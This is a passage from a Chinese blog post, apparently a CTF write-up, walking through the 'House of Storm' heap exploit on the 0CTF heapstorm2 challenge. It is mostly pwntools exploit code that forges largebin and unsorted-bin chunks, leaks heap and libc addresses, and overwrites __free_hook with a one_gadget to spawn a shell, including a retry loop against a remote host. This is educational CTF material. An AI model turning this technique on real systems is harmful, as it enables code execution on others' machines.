class="number">-0xc</span>)*<span class="string">'b'</span>)</span><br><span class="line">    malloc(<span class="number">0x70</span>)</span><br><span class="line">    malloc(<span class="number">0x470</span>)<span class="comment">#4</span></span><br><span class="line">    <span class="comment"># #fake_chunk2 #4</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    malloc(<span class="number">0x540</span>)<span class="comment">#2</span></span><br><span class="line">    py = <span class="string">''</span></span><br><span class="line">    py += <span class="string">'\x00'</span>*<span class="number">0x70</span></span><br><span class="line">    py += p64(<span class="number">0</span>) + p64(<span class="number">0x481</span>)</span><br><span class="line">    py += <span class="string">'\x00'</span>*<span class="number">0x470</span></span><br><span class="line">    py += p64(<span class="number">0x480</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line">    update(<span class="number">2</span>,len(py),py)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    malloc(<span class="number">0x580</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    py = <span class="string">''</span></span><br><span class="line">    py += <span class="string">'\x00'</span>*<span class="number">0x60</span></span><br><span class="line">    py += p64(<span class="number">0</span>) + p64(<span class="number">0x491</span>)</span><br><span class="line">    py += p64(<span class="number">0</span>) + p64(mmap_addr<span class="number">-0x10</span>)</span><br><span class="line">    py += <span class="string">'\x00'</span>*<span class="number">0x470</span></span><br><span class="line">    py += p64(<span class="number">0x490</span>) + p64(<span class="number">0x50</span>)</span><br><span class="line">    update(<span class="number">1</span>,len(py),py)</span><br><span class="line"></span><br><span class="line">    py = <span class="string">''</span></span><br><span class="line">    py += <span class="string">'\x00'</span>*<span class="number">0x70</span></span><br><span class="line">    py += p64(<span class="number">0</span>) + p64(<span class="number">0x481</span>)</span><br><span class="line">    py += p64(<span class="number">0</span>) + p64(mmap_addr<span class="number">-0x10</span>+<span class="number">8</span>)</span><br><span class="line">    py += p64(<span class="number">0</span>) + p64(mmap_addr<span class="number">-0x10</span><span class="number">-0x18</span><span class="number">-5</span>)</span><br><span class="line">    py += <span class="string">'\x00'</span>*<span class="number">0x450</span></span><br><span class="line">    py += p64(<span class="number">0x480</span>) + p64(<span class="number">0x50</span>)</span><br><span class="line">    update(<span class="number">2</span>,len(py),py) </span><br><span class="line"></span><br><span class="line">    malloc(<span class="number">0x48</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">    py = <span class="string">''</span></span><br><span class="line">    py += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    py += p64(<span class="number">0x13377331</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    py += p64(<span class="number">0x13370820</span>)</span><br><span class="line">    update(<span class="number">5</span>,len(py),py)</span><br><span class="line">    py = <span class="string">''</span></span><br><span class="line">    py += p64(<span class="number">0x13370820</span>) + p64(<span class="number">8</span>)</span><br><span class="line">    py += p64(<span class="number">0x133707f0</span>+<span class="number">3</span>) + p64(<span class="number">8</span>)</span><br><span class="line">    update(<span class="number">0</span>,len(py),py)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">"Chunk[1]: "</span>)</span><br><span class="line">    heap = u64(rc(<span class="number">8</span>)) - <span class="number">0x90</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"heap---&gt;"</span>  + hex(heap)</span><br><span class="line">    <span class="comment"># debug(0)</span></span><br><span class="line">    py = <span class="string">''</span></span><br><span class="line">    py += p64(<span class="number">0x13370820</span>) + p64(<span class="number">8</span>)</span><br><span class="line">    py += p64(heap+<span class="number">0xa0</span>) + p64(<span class="number">8</span>)</span><br><span class="line">    update(<span class="number">0</span>,len(py),py)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">"Chunk[1]: "</span>)</span><br><span class="line">    libc_base = u64(rc(<span class="number">8</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base---&gt;"</span>  + hex(libc_base)</span><br><span class="line">    free_hook = libc_base + libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">    onegadget = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">    py = <span class="string">''</span></span><br><span class="line">    py += p64(<span class="number">0x13370820</span>) + p64(<span class="number">8</span>)</span><br><span class="line">    py += p64(free_hook) + p64(<span class="number">8</span>)</span><br><span class="line">    update(<span class="number">0</span>,len(py),py)</span><br><span class="line">    update(<span class="number">1</span>,<span class="number">8</span>,p64(onegadget))</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> local:</span><br><span class="line">            p = process(<span class="string">'./heapstorm2'</span>)</span><br><span class="line">            libc = elf.libc</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = remote(<span class="string">'192.168.100.20'</span>,<span class="number">50001</span>)</span><br><span class="line">            libc = ELF(<span class="string">'./libc-2.18.so'</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sl(<span class="string">"ls"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>下面就解释下，exp中的每一步是在实现什么东西：</p>
<p>首先得有2个大堆块，作为largebin的堆块，因为presize无法控制，所以我们就shrink the chunk，先缩小堆块，然后再unlink合并，这里free时的nextsize要设置好。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">malloc(<span class="number">0x520</span>)<span class="comment">#1</span></span><br><span class="line">malloc(<span class="number">0x18</span>)<span class="comment">#2</span></span><br><span class="line">malloc(<span class="number">0x18</span>)<span class="comment">#3</span></span><br><span class="line">malloc(<span class="number">0x520</span>)<span class="comment">#4</span></span><br><span class="line">malloc(<span class="number">0x18</span>)<span class="comment">#5</span></span><br><span class="line">malloc(<span class="number">0x18</span>)<span class="comment">#6</span></span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">0x4f0</span></span><br><span class="line">py += p64(<span class="number">0x500</span>) + p64(<span class="number">0x30</span>)</span><br><span class="line">update(<span class="number">1</span>,len(py),py)</span><br><span class="line"><span class="comment"># debug(0)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="number">0x18</span><span class="number">-0xc</span>,(<span class="number">0x18</span><span class="number">-0xc</span>)*<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">malloc(<span class="number">0x480</span>)<span class="comment">#7</span></span><br><span class="line"><span class="comment">#large_chunk1 #7</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">malloc(<span class="number">0x540</span>)<span class="comment">#1</span></span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'\x00'</span>*<span class="number">0x60</span></span><br><span class="line">py += p64(<span class="number">0</span>) + p64(<span class="number">0x491</span>)</span><br><span class="line">py += <span class="string">'\x00'</span>*<span class="number">0x480</span></span><br><span class="line">py += p64(<span class="number">0x490</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line">update(<span class="number">1</span>,len(py),py)</span><br></pre></td></tr></table></figure>

<p>这样得到的0x540的1号堆块就能往下写从而修改free状态的7号块的fd和bk那些指针，第二个largebin一样的原理，但是要注意，这两个构造的largebin大小要不一样。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">0x4f0</span></span><br><span class="line">py += p64(<span class="number">0x500</span>) + p64(<span class="number">0x30</span>)</span><br><span class="line">update(<span class="number">4</span>,len(py),py)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">update(<span class="number">3</span>,<span class="number">0x18</span><span class="number">-0xc</span>,(<span class="number">0x18</span><span class="number">-0xc</span>)*<span class="string">'b'</span>)</span><br><span class="line">malloc(<span class="number">0x70</span>)</span><br><span class="line">malloc(<span class="number">0x470</span>)<span class="comment">#4</span></span><br><span class="line"><span class="comment"># #large_chunk2 #4</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">malloc(<span class="number">0x540</span>)<span class="comment">#2</span></span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'\x00'</span>*<span class="number">0x70</span></span><br><span class="line">py += p64(<span class="number">0</span>) + p64(<span class="number">0x481</span>)</span><br><span class="line">py += <span class="string">'\x00'</span>*<span class="number">0x470</span></span><br><span class="line">py += p64(<span class="number">0x480</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line">update(<span class="number">2</span>,len(py),py)</span><br></pre></td></tr></table></figure>

<p>部署好后，应该是这样的堆块布局：得到0x491和0x481的largebin</p>
<p><img src="/blog_img/1571418831493.png" alt="57141883149"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">4</span>)</span><br><span class="line">malloc(<span class="number">0x580</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br></pre></td></tr></table></figure>

<p>4号放largebin，7号放unsorted bin</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'\x00'</span>*<span class="number">0x60</span></span><br><span class="line">py += p64(<span class="number">0</span>) + p64(<span class="number">0x491</span>)</span><br><span class="line">py += p64(<span class="number">0</span>) + p64(mmap_addr<span class="number">-0x10</span>)<span class="comment">#unsorteb中构造chunk，bk指针很重要，fd可以没有</span></span><br><span class="line">py += <span class="string">'\x00'</span>*<span class="number">0x470</span></span><br><span class="line">py += p64(<span class="number">0x490</span>) + p64(<span class="number">0x50</span>)</span><br><span class="line">update(<span class="number">1</span>,len(py),py)</span><br></pre></td></tr></table></figure>

<p>这里是改unsortedbin的bk指针为我们伪造的fake_chunk的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'\x00'</span>*<span class="number">0x70</span></span><br><span class="line">py += p64(<span class="number">0</span>) + p64(<span class="number">0x481</span>)</span><br><span class="line">py += p64(<span class="number">0</span>) + p64(mmap_addr<span class="number">-0x10</span>+<span class="number">8</span>)<span class="comment">#fake_chunk的bk写入堆地址，保证完整性，能其能被申请出来</span></span><br><span class="line">py += p64(<span class="number">0</span>) + p64(mmap_addr<span class="number">-0x10</span><span class="number">-0x18</span><span class="number">-5</span>)<span class="comment">#伪造fake_chunk的size头</span></span><br><span class="line">py += <span class="string">'\x00'</span>*<span class="number">0x450</span></span><br><span class="line">py += p64(<span class="number">0x480</span>) + p64(<span class="number">0x50</span>)</span><br><span class="line">update(<span class="number">2</span>,len(py),py)</span><br></pre></td></tr></table></figure>

<p>改largebin的bk和bk_nextsize指针，当新的堆块插进largebin时，会在(mmap_addr-0x10+8）的fd处写入堆地址，同样在（mmap_addr-0x10-0x18-5）的fd_nextsize写入堆地址（成功伪造出fake_chunk的size头），实现largebin的attack。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0x48</span>)</span><br></pre></td></tr></table></figure>

<p>这一步是触发largebin的attack，先遍历unsotedbin，发现有我们释放的largebin大小的堆块，但是因为不是last remainer，所以无法切割给用户，就会插入到largebin，触发攻击，在（mmap_addr-0x10-0x18-5）的fd_nextsize写入堆地址，由于剩下我们的bk所指的fake_chunk在main_arena上，此时fake_chunk由于largebin的攻击，已经有size头了，当我们malloc(0x48)时，就会把fake_chunk申请出来，接着就可以开始操作了，但是有时候会失败，所以我写了个小型爆破。</p>
<p><img src="/blog_img/1571419920103.png" alt="57141992010"></p>
<p>可以看到fake_chunk的头是0x56大小</p>
<p>这里0x13370800正是放随机数的地址，我们写成0，这样每次异或得到都是本身，同时改0x13370810和0x13370818为0x13377331和0，就可以使用view函数打印地址了，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">py = <span class="string">''</span></span><br><span class="line">py += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">py += p64(<span class="number">0x13377331</span>) + p64(<span class="number">0</span>)</span><br><span class="line">py += p64(<span class="number">0x13370820</span>)<span class="comment">#首堆块的地址，方便下一次从自身开始update写入</span></span><br><span class="line">update(<span class="number">5</span>,len(py),py)</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += p64(<span class="number">0x13370820</span>) + p64(<span class="number">8</span>)</span><br><span class="line">py += p64(<span class="number">0x133707f0</span>+<span class="number">3</span>) + p64(<span class="number">8</span>)<span class="comment">#泄露堆地址</span></span><br><span class="line">update(<span class="number">0</span>,len(py),py)</span><br><span class="line">ru(<span class="string">"Chunk[1]: "</span>)</span><br><span class="line">heap = u64(rc(<span class="number">8</span>)) - <span class="number">0x90</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap---&gt;"</span>  + hex(heap)</span><br></pre></td></tr></table></figure>

<p>泄露libc原理一样：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">py = <span class="string">''</span></span><br><span class="line">py += p64(<span class="number">0x13370820</span>) + p64(<span class="number">8</span>)</span><br><span class="line">py += p64(heap+<span class="number">0xa0</span>) + p64(<span class="number">8</span>)</span><br><span class="line">update(<span class="number">0</span>,len(py),py)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">"Chunk[1]: "</span>)</span><br><span class="line">libc_base = u64(rc(<span class="number">8</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base---&gt;"</span>  + hex(libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">onegadget = libc_base + <span class="number">0xf02a4</span></span><br></pre></td></tr></table></figure>

<p>最后改free_hook为onegadget，free实现getshell：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">py = <span class="string">''</span></span><br><span class="line">py += p64(<span class="number">0x13370820</span>) + p64(<span class="number">8</span>)</span><br><span class="line">py += p64(free_hook) + p64(<span class="number">8</span>)</span><br><span class="line">update(<span class="number">0</span>,len(py),py)</span><br><span class="line">update(<span class="number">1</span>,<span class="number">8</span>,p64(onegadget))</span><br><span class="line">free(<span class="number">6</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/blog_img/1571420436863.png" alt="57142043686"></p>
<p>总结：</p>
<h4 id="house-of-storm就是结合largebin的插入实现任意地址写堆地址和unsorted-bin的非lastremainer不切割的一种攻击方式，能实现申请出一个不可控的地址的堆块（需要伪造size和bk指针）从而修改数据，比较巧妙，也挺有趣，关键指针布局好，堆块就能出来，搞清楚了堆块布局就可以实现。"><a href="#house-of-storm就是结合largebin的插入实现任意地址写堆地址和unsorted-bin的非lastremainer不切割的一种攻击方式，能实现申请出一个不可控的地址的堆块（需要伪造size和bk指针）从而修改数据，比较巧妙，也挺有趣，关键指针布局好，堆块就能出来，搞清楚了堆块布局就可以实现。" class="headerlink" title="house of storm就是结合largebin的插入实现任意地址写堆地址和unsorted bin的非lastremainer不切割的一种攻击方式，能实现申请出一个不可控的地址的堆块（需要伪造size和bk指针）从而修改数据，比较巧妙，也挺有趣，关键指针布局好，堆块就能出来，搞清楚了堆块布局就可以实现。"></a>house of storm就是结合largebin的插入实现任意地址写堆地址和unsorted bin的非lastremainer不切割的一种攻击方式，能实现申请出一个不可控的地址的堆块（需要伪造size和bk指针）从而修改数据，比较巧妙，也挺有趣，关键指针布局好，堆块就能出来，搞清楚了堆块布局就可以实现。</h4>
            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls"
                data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
            <ul id="audio-list" style="display:none">
                
                
                <li title='0' data-url='/statics/chengdu.mp3'></li>
                
                    
            </ul>
            
            
            
    <div id='gitalk-container' class="comment link"
        data-ae='true'
        data-ci='ec894e2b66f752e8b7fb'
        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
        data-r='blog-comments'
        data-o='TriDiamond'
        data-a='TriDiamond'
        data-d=''
    >Comments</div>


            
            
        </div>
        <div class="sidebar">
            <div class="box animated fadeInRight">
                <div class="subbox">
                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
                    <p>V1ct0r</p>
                    <span>Where there is a will,there is a way！</span>
                    <dl>
                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
                                    class=" iconfont icon-github"></span></a></dd>
                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
                                    class=" iconfont icon-twitter"></span></a></dd>
                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
                                    class=" iconfont icon-stack-overflow"></span></a></dd>
                    </dl>
                </div>
                <ul>
                    <li><a href="/">92 <p>Articles</p></a></li>
                    <li><a href="/categories">20 <p>Categories</p></a></li>
                    <li><a href="/tags">82 <p>Tags</p></a></li>
                </ul>
            </div>
            
            
            
            <div class="box sticky animated fadeInRight faster">
                <div id="toc" class="subbox">
                    <h4>Contents</h4>
                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、largebin的原理学习"><span class="toc-number">1.</span> <span class="toc-text">一、largebin的原理学习</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、largebin的攻击原理"><span class="toc-number">2.</span> <span class="toc-text">二、largebin的攻击原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、题目演示"><span class="toc-number">3.</span> <span class="toc-text">三、题目演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0CTF的一道house-0f-storm："><span class="toc-number">4.</span> <span class="toc-text">0CTF的一道house 0f storm：</span></a></li></ol>
                </div>
            </div>
            
            
        </div>
    </div>
</div>

    </div>
</div>
    <div id="back-to-top" class="animated fadeIn faster">
        <div class="flow"></div>
        <span class="percentage animated fadeIn faster">0%</span>
        <span class="iconfont icon-top02 animated fadeIn faster"></span>
    </div>
</body>
<footer>
    <p class="copyright" id="copyright">
        &copy; 2021
        <span class="gradient-text">
            V1ct0r
        </span>.
        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
        Theme
        <span class="gradient-text">
            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
        </span>
        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
    </p>
</footer>

<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<script>
  MathJax.Hub.Config({
    "HTML-CSS": {
      preferredFont: "TeX",
      availableFonts: ["STIX", "TeX"],
      linebreaks: {
        automatic: true
      },
      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
      inlineMath: [
        ["$", "$"],
        ["\\(", "\\)"]
      ],
      processEscapes: true,
      ignoreClass: "tex2jax_ignore|dno",
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
      noUndefined: {
        attributes: {
          mathcolor: "red",
          mathbackground: "#FFEEEE",
          mathsize: "90%"
        }
      },
      Macros: {
        href: "{}"
      }
    },
    messageStyle: "none"
  });
</script>
<script>
  function initialMathJax() {
    MathJax.Hub.Queue(function () {
      var all = MathJax.Hub.getAllJax(),
        i;
      // console.log(all);
      for (i = 0; i < all.length; i += 1) {
        console.log(all[i].SourceElement().parentNode)
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  }

  function reprocessMathJax() {
    if (typeof MathJax !== 'undefined') {
      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
    }
  }
</script>



    
<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">

    
<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>



<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/obsidian.js"></script>
<script src="/js/jquery.truncate.js"></script>
<script src="/js/search.js"></script>


<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>


<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>


<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>


<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>

    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>




    
<script src="/js/busuanzi.min.js"></script>

    <script>
        $(document).ready(function () {
            if ($('span[id^="busuanzi_"]').length) {
                initialBusuanzi();
            }
        });
    </script>



<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">


<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>



    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-149874671-1');
    </script>





<script>
    function initialTyped () {
        var typedTextEl = $('.typed-text');
        if (typedTextEl && typedTextEl.length > 0) {
            var typed = new Typed('.typed-text', {
                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
                typeSpeed: 90,
                loop: true,
                loopCount: Infinity,
                backSpeed: 20,
            });
        }
    }

    if ($('.article-header') && $('.article-header').length) {
        $(document).ready(function () {
            initialTyped();
        });
    }
</script>




</html>
